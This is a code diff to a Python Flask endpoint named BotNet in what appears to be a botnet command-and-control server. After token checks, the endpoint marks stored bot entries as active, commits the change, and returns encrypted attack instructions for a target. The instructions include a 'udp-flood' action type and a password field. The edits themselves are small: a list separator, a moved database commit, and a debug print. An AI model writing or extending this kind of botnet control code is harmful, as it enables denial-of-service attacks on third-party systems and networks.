@@ -219,7 +219,7 @@ def BotNet(target_name):
             api_token = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
             if len(api_token) == 0:
                 return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
-            botNets = getlist(_session.query(APILink).filter_by(target_name=target_name).all())
+            botNets = getlist(_session.query(APILink).filter_by(target_name=target_name).all(),sp=',')
             response = {'botNets': {}}
             for botNet in botNets:
                 _session.query(APILink).filter_by(ID=botNet[0]).update(
@@ -227,6 +227,7 @@ def BotNet(target_name):
                         'condition': config.BOTNET_STATUS[1], 
                     }
                 )
+                _session.commit()
                 if botNet[4] == config.ACTION_TYPE[0]: # udp-flood
                     response['botNets'] = {
                         config.ACTION_TYPE[0]: {
@@ -245,7 +246,7 @@ def BotNet(target_name):
                             'password': botNet[9]  # filled name
                         }
                     }
-            _session.commit()
+            print('\n\n\n'*3,'response=========',response,'\n\n\n'*3)
             return jsonify(encrypt_payload(response)), 200
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
